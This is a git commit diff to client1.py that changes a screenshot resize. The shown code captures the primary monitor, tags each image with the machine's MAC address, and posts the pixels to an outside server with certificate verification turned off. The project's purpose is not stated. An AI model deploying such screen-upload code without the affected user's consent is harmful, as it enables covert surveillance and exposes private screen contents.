6fefb33f8fa8072c6cee2709470d0f713a80b3d4
Ayberk Atalay <105879357+AyberkAtalay0@users.noreply.github.com>
2024-02-20 06:12:52 +0300

    Update client1.py

--- client1.py
+++ client1.py
@@ -26,7 +26,7 @@ def mainloop(fps):
       with mss() as visual:
         image = visual.grab(visual.monitors[1])
         image = Image.frombytes("RGB", image.size, image.rgb)
-        image = image.resize((image.width//4, image.height//4))
+        image = image.resize((768, 432))
         name = hex(getnode())
         post(url="http://www.oatis.xyz/stream", json={"pixels": str(list(image.getdata())), "name": str(name)}, verify=False)
         print("Image sent from:", str(name))
